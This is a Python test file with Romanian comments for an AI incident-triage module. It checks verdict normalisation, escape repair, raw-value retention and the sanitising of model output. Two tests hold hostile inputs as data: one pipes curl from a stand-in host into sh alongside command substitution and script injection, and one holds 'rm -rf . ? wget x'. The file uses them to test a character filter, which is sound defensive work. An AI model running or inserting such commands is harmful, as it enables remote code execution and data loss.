"""`recommended_action` ajunge în `ai_verdict` ca unul din cele cinci cuvinte, sau
ca `unknown` CU dovada la vedere — nu ca un șir care nu seamănă cu nimic.

Măsurat pe producție pe 6 octombrie 2026: din 791 de verdicte, 622 erau scrise în
una din 12 ortografii ale celor cinci cuvinte și doar 20 chiar cuvântul corect;
169 erau `unknown`, iar valoarea brută din spatele lor se aruncase. 415 aveau
literal șase caractere în loc de `ă` (backslash, u, 0103). Câmpul nu are cititor
în cod, deci nimeni n-a văzut cum 91% din verdictele ultimei săptămâni nu spun
nimic.

Eșecurile pe care le previn testele de aici:

  * **Modelul e rugat să scrie `ă` într-o valoare constrânsă.** Toate cele 415
    de cazuri cu backslash erau pe câmpul ăsta și numai pe el; `summary_ro`, din
    același apel, avea diacritice adevărate în 790 de rânduri din 791. Enum-ul
    cerut e ASCII; cuvintele românești rămân doar ce se STOCHEAZĂ.
  * **Plasa care nu prinde forma de escape.** Un răspuns deja în zbor, scris cu
    backslash-u, ajunge `unknown` și operatorul vede «nu știu» în loc de
    «blochează».
  * **Dovada aruncată.** `unknown` fără valoarea brută nu se poate deosebi de
    «modelul n-a spus nimic», iar o eventuală reapariție a defectului rămâne
    nevăzută.
  * **Dovada care devine o a doua suprafață de afișare sau un canal.** Cheia soră
    pleacă la agregator în blobul `ai_verdict`, iar valoarea ei e text produs de
    model pornind de la dovezi controlate de atacator.
  * **Cheia soră prezentă pe tot** — atunci prezența ei nu mai înseamnă nimic, și
    verificarea de după livrare («cheia lipsește pe verdictele noi») nu mai poate
    spune dacă tratamentul a mers.
  * **Un client care «repară» textul.** Un decodor pus în `call_structured` ar
    strica orice sumar care conține legitim un backslash (o cale Windows, un
    regex din dovezi).

Backslash-ul se construiește din `chr(92)` peste tot: unealta prin care se scrie
fișierul înjumătățește barele și convertește secvențele de escape.
"""

from __future__ import annotations

import asyncio
import re
from datetime import datetime, timezone
from types import SimpleNamespace

import httpx
import pytest

from sentinel.ai import client, triage

BS = chr(92)
A_BREVE = chr(0x103)      # ă
ESC_A = BS + "u0103"      # cele 6 caractere pe care le-a stocat producția în loc de ă


# --- ce i se cere modelului ---------------------------------------------------
def test_the_model_is_asked_for_ascii_ids_not_for_a_diacritic():
    """Enum-ul din schema trimisă modelului nu are nicio literă non-ASCII.

    Dacă cineva îl pune la loc pe cel românesc (`blochează`), modelul e iar
    rugat să scrie `ă` într-o valoare constrânsă — exact câmpul în care 415 din
    791 de răspunsuri au venit cu backslash literal — și jumătate din verdicte
    devin din nou `unknown`.
    """
    enum = triage.TRIAGE_TOOL["input_schema"]["properties"]["recommended_action"]["enum"]
    assert enum, "enum-ul cerut modelului a ieșit gol"
    assert all(v.isascii() for v in enum), (
        f"modelul e rugat să scrie o literă non-ASCII într-o valoare constrânsă: {enum}")


def test_every_stored_word_is_reachable_from_exactly_one_asked_for_id():
    """Fiecare cuvânt stocat are un id cerut modelului, și invers.

    Un cuvânt adăugat în `_ACTION_ENUM` fără id pe sârmă n-ar fi niciodată
    oferit modelului: câmpul ar tăcea despre o acțiune, în liniște.
    """
    enum = triage.TRIAGE_TOOL["input_schema"]["properties"]["recommended_action"]["enum"]
    assert sorted(triage._ACTION_WIRE.values()) == sorted(triage._ACTION_ENUM)
    assert sorted(enum) == sorted(triage._ACTION_WIRE)


@pytest.mark.parametrize("wire,word", sorted(triage._ACTION_WIRE.items()))
def test_each_asked_for_id_is_stored_as_its_romanian_word(wire, word):
    """Ce primește panoul e același cuvânt de dinainte; nu se schimbă
    vocabularul stocat, deci istoricul și afișarea rămân comparabile."""
    v = triage._clean({"recommended_action": wire})
    assert v["recommended_action"] == word
    assert "recommended_action_raw" not in v


# --- plasa ----------------------------------------------------------------------
@pytest.mark.parametrize("stem,word", [
    ("blocheaz", "blochează"), ("investigheaz", "investighează"),
    ("monitorizeaz", "monitorizează"), ("ignor", "ignoră"),
])
@pytest.mark.parametrize("backslashes", [1, 2])
def test_the_net_places_the_literal_escape_form(stem, word, backslashes):
    """`blocheaz` + backslash + `u0103` — cele 6 caractere stocate de 415 ori —
    se plasează pe cuvânt, atât cu un backslash cât și cu două (un nivel de
    JSON prea puțin și unul prea mult).

    Fără asta, un răspuns deja în zbor devine `unknown` și operatorul citește
    «nu știu» acolo unde modelul spusese «blochează».
    """
    raw = stem + BS * backslashes + "u0103"
    v = triage._clean({"recommended_action": raw})
    assert v["recommended_action"] == word


def test_the_escape_decoder_is_applied_only_to_the_action_field():
    """Un backslash legitim într-un sumar nu se atinge.

    Sumarul poate cita o cale Windows sau un regex din dovezi; dacă decodorul
    ar curge în `summary_ro`, operatorul ar citi o literă în loc de calea reală.
    """
    summary = "cale " + "C:" + BS + "users" + BS + "u0103x" + " sau " + ESC_A
    v = triage._clean({"recommended_action": "block", "summary_ro": summary})
    assert v["summary_ro"] == summary


def test_a_prefix_shared_by_a_word_and_its_id_is_not_ambiguous():
    """`bloc` e prefix și pentru `block`, și pentru `blocheaza` — aceeași
    acțiune, nu doi candidați. Cu o listă în loc de mulțime, un răspuns
    trunchiat valid ar deveni `unknown` doar fiindcă are doi sinonimi."""
    assert triage._clean({"recommended_action": "bloc"})["recommended_action"] == "blochează"
    assert triage._clean({"recommended_action": "inve"})["recommended_action"] == "investighează"


def test_a_prefix_of_two_different_actions_is_still_refused():
    """Plasa nu ghicește: `i` și `bl` (sub 4 litere) rămân `unknown`."""
    for frag in ("i", "bl", "mon"):
        assert triage._clean({"recommended_action": frag})["recommended_action"] == "unknown"


def test_a_lone_surrogate_escape_does_not_crash_and_does_not_match():
    """Un `ud800` literal e jumătate de caracter: nu se poate pune într-un cheie
    codificabilă. Nu trebuie să arunce (un triaj căzut = verdict pierdut) și nu
    trebuie să potrivească nimic."""
    v = triage._clean({"recommended_action": "blocheaz" + BS + "ud800"})
    assert v["recommended_action"] == "unknown"


# --- dovada păstrată ------------------------------------------------------------
def test_an_unplaceable_answer_keeps_what_the_model_actually_said():
    """`unknown` poartă valoarea brută lângă el.

    Până pe 6 octombrie 2026 se arunca; 169 de verdicte nu se mai puteau
    deosebi între «a spus ceva ce nu citim» și «n-a spus nimic».
    """
    v = triage._clean({"recommended_action": "taie ramura"})
    assert v["recommended_action"] == "unknown"
    assert v["recommended_action_raw"] == "taie ramura"


def test_an_answer_the_net_had_to_repair_also_keeps_its_raw_value():
    """Plasarea prin plasă nu o ascunde: `investigheaz` → `investighează`, cu
    `investigheaz` păstrat. Doar așa se vede, după livrare, câte răspunsuri
    mai au nevoie de plasă."""
    v = triage._clean({"recommended_action": "investigheaz"})
    assert v["recommended_action"] == "investighează"
    assert v["recommended_action_raw"] == "investigheaz"


def test_the_raw_rendering_tells_a_real_letter_from_its_literal_spelling():
    """`blochează` cu ă adevărat și cu cele 6 caractere literale nu au voie să
    arate la fel în cheia soră — altfel nu s-ar putea deosebi «modelul a scris
    bine și noi am stricat» de «modelul a scris backslash»."""
    real = triage._render_raw("blocheaz" + A_BREVE + "x")
    literal = triage._render_raw("blocheaz" + ESC_A + "x")
    assert real != literal
    assert real.count(BS) == 1          # ă → o secvență de escape de randare
    assert literal.count(BS) == 2       # backslash-ul literal, dublat de randare


def test_an_exact_answer_carries_no_raw_key():
    """Cheia soră e absentă când răspunsul a fost exact unul din cele cerute.

    Dacă ar fi prezentă pe tot, prezența ei n-ar mai însemna «plasa a lucrat
    aici», iar verificarea de după livrare — cheia lipsește pe verdictele noi —
    n-ar mai putea spune dacă schimbarea de schemă a ajutat.
    """
    for exact in [*triage._ACTION_WIRE, *triage._ACTION_ENUM]:
        assert "recommended_action_raw" not in triage._clean({"recommended_action": exact}), exact


def test_a_missing_field_is_recorded_as_missing_not_as_garbled():
    """Câmp absent → `unknown` și cheia soră `None`; câmp prezent dar ilizibil
    → `unknown` și textul. Cele două au cauze diferite (modelul a omis câmpul
    vs. a scris ceva ce nu citim) și nu au voie să arate la fel."""
    absent = triage._clean({})
    assert absent["recommended_action"] == "unknown"
    assert "recommended_action_raw" in absent and absent["recommended_action_raw"] is None
    garbled = triage._clean({"recommended_action": "???"})
    assert garbled["recommended_action_raw"] == "???"


@pytest.mark.parametrize("weird", [["patch"], {"a": 1}, 5, True])
def test_a_non_string_answer_is_unknown_and_never_raises(weird):
    """O listă sau un dicționar nu sunt hashable: `in <dict>` ar arunca, iar un
    triaj care aruncă pierde verdictul întreg (severitate, rezumat), nu doar
    acțiunea."""
    v = triage._clean({"recommended_action": weird, "summary_ro": "ok"})
    assert v["recommended_action"] == "unknown"
    assert v["summary_ro"] == "ok"
    assert "recommended_action_raw" in v


_SAFE = re.compile(r"[A-Za-z0-9 _.\-" + re.escape(BS) + r"?]*")


def test_the_raw_value_cannot_carry_a_command_line_to_the_aggregator():
    """Valoarea brută e text produs de model pornind de la dovezi controlate de
    atacator, iar cheia soră pleacă la agregator în blobul `ai_verdict`.

    Un «răspuns» cu pipe, punct și virgulă, `$()`, ghilimele sau `<script>` ar
    rămâne în rând ca atare și ar ajunge, mai târziu, pe orice ecran, mesaj sau
    copiere în terminal care îl afișează. Randarea are alfabet închis.

    Ce NU dovedește: filtrul taie caractere, nu cuvinte — `rm -rf . ? wget x`
    trece (testul de mai jos o spune). Și nu apără de WAF-ul agregatorului:
    din 26 august fluxurile pleacă într-un plic opac, deci WAF-ul nu citește
    textul.
    """
    nasty = "curl http://e.vil/x | sh; $(id) `id` <script>alert(1)</script> \"q\" 'q'"
    shown = triage._clean({"recommended_action": nasty})["recommended_action_raw"]
    assert _SAFE.fullmatch(shown), shown
    for ch in "|;$()`<>\"'/:":
        assert ch not in shown, f"{ch!r} a ajuns în valoarea brută: {shown!r}"


def test_the_whitelist_filters_characters_not_words():
    """Un `rm -rf . ? wget x` trece de alfabet: cuvintele rămân. Testul fixează
    limita ca să nu o citească nimeni ca pe o apărare împotriva unei linii de
    comandă — un cititor care crede asta nu mai pune ghilimele în jurul valorii
    când o afișează."""
    shown = triage._clean({"recommended_action": "rm -rf . ? wget x"})["recommended_action_raw"]
    assert shown == "rm -rf . ? wget x"


def test_the_raw_value_is_bounded():
    """Câmpul nu poate umfla blobul: plafonul e pe intrare ȘI pe randare (un
    caracter non-ASCII devine până la 10 caractere de escape)."""
    shown = triage._clean({"recommended_action": chr(0x1F600) * 500})["recommended_action_raw"]
    assert len(shown) <= triage._RAW_SHOWN


# --- clientul nu repară -----------------------------------------------------------
def _call_with_wire(monkeypatch, wire_action: str):
    summary = "Atac " + BS + "u0219i " + BS + "u021bint" + BS + "u0103"
    body = ('{"usage":{},"content":[{"type":"tool_use","name":"record_triage","input":'
            '{"recommended_action":"' + wire_action + '","summary_ro":"' + summary + '"}}]}')
    seen: dict[str, bytes] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen["request"] = request.content
        return httpx.Response(200, content=body.encode(),
                              headers={"content-type": "application/json"})

    real = httpx.AsyncClient

    class _Client(real):
        def __init__(self, *a, **k):
            k["transport"] = httpx.MockTransport(handler)
            super().__init__(*a, **k)

    monkeypatch.setattr(client.httpx, "AsyncClient", _Client)
    result = asyncio.run(client.call_structured(
        "k", model="m", system="s", user="u", tool=triage.TRIAGE_TOOL))
    return result, seen["request"]


def test_the_client_decodes_json_exactly_once(monkeypatch):
    """Un `ă` scris o singură dată în JSON ajunge literă adevărată, la fel în
    `recommended_action` și în `summary_ro`.

    Fixează granița: dacă un backslash literal ajunge vreodată la `triage`, nu
    l-a produs `call_structured` — l-a primit așa.
    """
    wire = "blocheaz" + BS + "u0103"
    result, _ = _call_with_wire(monkeypatch, wire)
    assert result.tool_input["recommended_action"] == "blocheaz" + A_BREVE
    assert BS not in result.tool_input["summary_ro"]
    assert triage._clean(result.tool_input)["recommended_action"] == "blochează"


def test_the_client_does_not_repair_a_double_escaped_value(monkeypatch):
    """Un backslash literal primit de la API rămâne literal în `tool_input`.

    Reparația stă în plasa de la `triage`, aplicată doar valorii care se
    compară cu cinci cuvinte. Un decodor în client ar rescrie ORICE câmp — și ar
    strica un sumar care citează o cale Windows.
    """
    wire = "blocheaz" + BS + BS + "u0103"
    result, _ = _call_with_wire(monkeypatch, wire)
    assert result.tool_input["recommended_action"] == "blocheaz" + ESC_A
    assert triage._clean(result.tool_input)["recommended_action"] == "blochează"


def test_the_request_carries_no_non_ascii_enum_value(monkeypatch):
    """Ce pleacă pe sârmă ca enum nu depinde de versiunea lui httpx.

    Producția rulează httpx 0.27.2, care serializează cu `ensure_ascii=True`
    (enum-ul pleacă ca `monitorizeaz` + backslash + u0103); suita locală poate
    rula 0.28, care trimite UTF-8. Cu un enum ASCII cele două sunt identice.
    """
    _, request = _call_with_wire(monkeypatch, "block")
    for wire_id in triage._ACTION_WIRE:
        assert wire_id.encode() in request
    prop_at = request.index(b'"recommended_action"')
    enum_at = request.index(b'"enum"', prop_at)
    enum_slice = request[enum_at:request.index(b"]", enum_at) + 1]
    assert BS.encode() not in enum_slice, enum_slice
    assert enum_slice.isascii(), enum_slice


# --- triaj de la un capăt la altul (fără API real) --------------------------------
def _incident():
    now = datetime(2026, 10, 6, 6, 0, tzinfo=timezone.utc)
    return SimpleNamespace(id=7, severity="high", actor_key="1.2.3.4", detection_count=3,
                           first_detection_at=now, last_detection_at=now,
                           title="brute-force ssh", summary="x")


class _Recorder:
    def __init__(self):
        self.calls = []

    def _rec(self, level):
        def f(msg, *a, **k):
            self.calls.append((level, msg, k.get("extra", {})))
        return f

    @property
    def warning(self):
        return self._rec("warning")

    @property
    def info(self):
        return self._rec("info")


def _run_triage(monkeypatch, tool_input):
    stored = {}
    recorder = _Recorder()

    async def fake_get(db, iid):
        return _incident()

    async def fake_dets(db, iid, limit=5):
        return []

    async def fake_call(*a, **k):
        return client.Result(ok=True, tool_input=tool_input, usage=client.Usage())

    async def fake_record(*a, **k):
        return None

    async def fake_set(db, iid, *, ai_severity, verdict, confidence):
        stored.update(verdict=verdict, ai_severity=ai_severity)

    monkeypatch.setattr(triage.inc_repo, "get_incident", fake_get)
    monkeypatch.setattr(triage.inc_repo, "incident_detections", fake_dets)
    monkeypatch.setattr(triage.inc_repo, "set_ai_verdict", fake_set)
    monkeypatch.setattr(triage.budget, "record", fake_record)
    monkeypatch.setattr(triage, "call_structured", fake_call)
    monkeypatch.setattr(triage, "log", recorder)
    cfg = SimpleNamespace(ai=SimpleNamespace(model_fast="m", max_tokens=100, timeout_s=5))
    ok = asyncio.run(triage.triage_incident(None, cfg, "k", 7))
    return ok, stored, recorder.calls


def test_an_unplaced_answer_is_stored_with_its_raw_value_and_logged_loudly(monkeypatch):
    """Cap la cap: răspunsul pe care plasa nu-l poate plasa ajunge în rând ca
    `unknown` + valoarea brută, și lasă o linie `warning` cu id-ul incidentului.

    Fără linia asta, singurul loc unde se vede defectul e o interogare SQL pe
    care nimeni n-o scrie până nu bănuiește deja.
    """
    ok, stored, calls = _run_triage(monkeypatch, {
        "severity": "high", "confidence": 0.9, "summary_ro": "x",
        "is_false_positive": False, "recommended_action": "taie ramura"})
    assert ok is True
    assert stored["verdict"]["recommended_action"] == "unknown"
    assert stored["verdict"]["recommended_action_raw"] == "taie ramura"
    warnings = [c for c in calls if c[0] == "warning"]
    assert len(warnings) == 1
    assert warnings[0][2]["incident_id"] == 7
    assert warnings[0][2]["raw_action"] == "taie ramura"


def test_the_triaged_line_carries_the_action_that_was_stored(monkeypatch):
    """Linia `incident triaged` e singura probă ieftină, după livrare, că
    serviciul rulează codul nou: cheia `action` există doar în el. Pe producție,
    liniile vechi au 9 chei, cele noi 10 — fără aceasta, un `sentinel-ai`
    nerepornit (care scrie încă `blocheaz` + backslash-u0103) arată identic cu
    unul vindecat, iar operatorul nu are cum să deosebească cele două stări.

    Valoarea din linie trebuie să fie CEA SCRISĂ în rând, nu cea primită: aici
    modelul trimite forma ruptă, iar linia o poartă pe cea plasată."""
    _, stored, calls = _run_triage(monkeypatch, {
        "severity": "high", "confidence": 0.9, "summary_ro": "x",
        "is_false_positive": False, "recommended_action": "blocheaz" + ESC_A})
    triaged = [c for c in calls if c[1] == "incident triaged"]
    assert len(triaged) == 1
    assert triaged[0][0] == "info"
    assert triaged[0][2] == {
        "incident_id": 7, "ai_severity": "high", "false_positive": False,
        "injection": False, "action": "blochează"}
    assert triaged[0][2]["action"] == stored["verdict"]["recommended_action"]


def test_a_placed_answer_logs_at_info_and_a_clean_one_logs_nothing_extra(monkeypatch):
    """O plasare reușită nu strigă (info, nu warning); un răspuns exact nu
    scrie nimic în plus — jurnalul nu se umple de zgomot pe calea sănătoasă."""
    _, stored, calls = _run_triage(monkeypatch, {
        "severity": "high", "confidence": 0.9, "summary_ro": "x",
        "is_false_positive": False, "recommended_action": "blocheaz" + ESC_A})
    assert stored["verdict"]["recommended_action"] == "blochează"
    assert [c[0] for c in calls if "not one of the ids" in c[1]] == ["info"]

    _, stored, calls = _run_triage(monkeypatch, {
        "severity": "high", "confidence": 0.9, "summary_ro": "x",
        "is_false_positive": False, "recommended_action": "block"})
    assert "recommended_action_raw" not in stored["verdict"]
    assert not [c for c in calls if "not one of the ids" in c[1]]
